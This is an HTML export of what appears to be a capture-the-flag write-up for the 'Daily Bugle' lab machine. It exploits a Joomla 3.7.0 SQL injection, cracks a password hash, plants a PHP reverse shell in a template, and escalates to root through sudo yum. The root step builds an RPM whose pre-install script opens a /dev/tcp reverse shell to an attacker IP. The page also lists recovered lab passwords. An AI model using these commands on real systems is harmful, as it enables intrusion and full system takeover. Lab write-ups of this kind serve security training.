<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>daily bugle</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>daily bugle</h1><br/><strong>Daily Bugle</strong><br /><br />nmap shows 22,80,3306 open<br /><br />22 - SSH<br />80 - Web server<br />3306 - MariaDB<br /><br />We browse throught the news webserver. We find the <strong>/administrator</strong> directory through <strong>gobuster</strong>.<br /><br /><br /><br />However, we do not have any credentials.<br /><br />We check wappalyzer to confirm joomla running on the webserver.<br />To get the version use the following Link/Command.<br />https://www.itoctopus.com/how-to-quickly-know-the-version-of-any-joomla-website<br /><br />For our case:<br /><em><strong>http://10.10.42.252/administrator/manifests/files/joomla.xml</strong></em><br /><br /><br />We get the version as 3.7.0<br /><br /><em><strong>searchsploit 3.7.0</strong></em><br /><br /><a href=""><img src="images/121-1.png" alt="images/121-1.png" /></a><br /><br />We get the file by: <em><strong>searchsploit -m php/webapps/42033.txt</strong></em><br /><br />Upon reading the file. It says to use sqlmap to exploit the vulnerability. However, sqlmap didn&#39;t find any intresting stuff.<br />Upon searching google for “Joomla 3.7.0 Python exploit”<br /><br />We find the following code:<br /><em><strong>https://github.com/XiphosResearch/exploits.git</strong></em><br /><br />In the git link, go to <em><strong>Joomblah</strong></em> directory and use the <em><strong>joomblah.py</strong></em> file<br /><br /><a href=""><img src="images/121-2.png" alt="images/121-2.png" /></a><br /><br />Now, we need to crack the hash using john.<br /><br /><em><strong>echo &#39;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm&#39; &gt; hash_joomla<br />john hash_joomla --wordlist=/usr/share/wordlists/rockyou.txt</strong></em><br /><br /><a href=""><img src="images/121-3.png" alt="images/121-3.png" /></a><br /><br />Now, we have a username and password.<br />Username	:	jonah<br />Password		:	spiderman123<br /><br />We use this login credentials at <em><strong>http://10.10.42.252/administrator</strong></em> page to login into joomla control panel as super user.	<br /><br />To get a shell from here on there are multiple options. (***Check research***)<br />We will use the templates section.<br /><br />Go to <em><strong>Extensions -→ Templates -→ Templates</strong></em><br /><br /><a href=""><img src="images/121-4.png" alt="images/121-4.png" /></a><br /><br />Then click on <em><strong>Beez3 Details and Files</strong></em><br />Now, open the <em><strong>index.php</strong></em> and replace a <em><strong>php-reverse-shell code</strong></em> in that place.<br /><br />Run a <strong>listner</strong> in attacker machine.<br />Then to exploit the malicious php file click on <strong>“Template Preview”</strong><br /><br />Now we will have gained a shell in our attacker machine.<br /><br /><strong>Privelege Escalation</strong><br />Next we check for ways to elevate our privelege.<br />sudo -l - Nothhing<br />/etc/crontab - Nothing<br />suid files	- Nothing<br /><br />We then browse the web server folder and find a file called “<strong>configuration.php</strong>”<br /><br /><em><strong>/var/www/html/configuration.php</strong></em><br /><br /><a href=""><img src="images/121-5.png" alt="images/121-5.png" /></a><br /><br /><br /><br />We find a password: <br />Upon enumeration we that the password is user password for <em><strong>jjameson</strong></em>.<br /><br />Username	:	jjameson<br />Password		:	nv5uz9r3ZEDzVjNu<br /><br /><br />we can now ssh to the machine as <em><strong>jjameson</strong></em> and get the <em><strong>user</strong></em> flag.<br /><br />Then we do <em><strong>sudo -l</strong></em><br /><a href=""><img src="images/121-6.png" alt="images/121-6.png" /></a><br /><br />We find yum is running in sudo.<br />Thus we use <strong>GTFObins</strong> to use this for privelege escalation.<br /><br /><strong>Note: </strong>We will create a malicious rpm file which will execute code upon installation.<br /><br /><strong>Tool used: </strong>fpm<br />(gem install fpm)<br /><br /><em><strong>Commands in Attacker Machine:</strong></em><br /><br />TF=$(mktemp -d)<br />echo &#39;id&#39; &gt; TF/x.sh<br />fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF<br /><br /><a href=""><img src="images/121-7.png" alt="images/121-7.png" /></a><br /><br /><strong>Note:</strong> This will run the ‘<strong>id</strong>’ command upon installation.<br /><br />We can tweak this to run a reverse shell.<br /><br />TF=$(mktemp -d)<br />echo &#39;/bin/sh -i &gt;&amp; /dev/tcp/10.11.72.31/8888 0&gt;&amp;1&#39; &gt; $TF/y.sh<br />fpm -n y -s dir -t rpm -a all --before-install $TF/y.sh $TF<br /><br /><a href=""><img src="images/121-8.png" alt="images/121-8.png" /></a><br /><br />Host these files in a python web server.<br />And start a netcat listener.<br /><br /><em><strong>Commands in Target Machine(ssh session of jjameson):</strong></em><br /><br /><em><strong>wget http://10.11.72.31/x-1.0-1.noarch.rpm<br />wget http://10.11.72.31/y-1.0-1.noarch.rpm</strong></em><br /><br />Then we run the following to install the malicious rpm and run our commands.<br /><br /><em><strong>sudo yum localinstall -y x-1.0-1.noarch.rpm</strong></em><br />This will run the ‘id’ command upon installation.<br /><br /><em><strong>sudo yum localinstall -y y-1.0-1.noarch.rpm</strong></em><br />This will run a reverse shell as root/<br /><br /><br /><br /><strong>Note:</strong> To remove the installation.( Say to run again)<br /><br /><em><strong>sudo yum remove x-1.0-1</strong></em><br />or<br /><em><strong>sudo yum remove y-1.0-1</strong></em><br /><br />Now in the root shell get the root flag<br /><br />Thanks!!</div>
</body>
</html>
